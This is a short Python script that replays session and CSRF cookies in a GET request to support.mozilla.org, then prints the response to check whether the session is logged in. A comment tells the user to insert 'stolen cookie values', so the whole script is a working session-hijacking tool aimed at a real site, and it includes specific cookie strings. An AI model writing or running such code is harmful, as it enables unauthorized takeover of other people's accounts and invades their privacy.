import requests

# Replace these with your stolen cookie values
cookies = {
    'session_id': 'iiv0krhcgeksxaeq2mc3n8vybgimdb96',
    'csrftoken': '4Btngu6EjuEw8BbCtTLw9zw5IDsPOVyB'
}

url = 'https://support.mozilla.org/'

# Send GET request with cookies
response = requests.get(url, cookies=cookies)

print(f"Status code: {response.status_code}")
# Print part of the response HTML to check if logged in
print(response.text[:1000])  # prints first 1000 characters
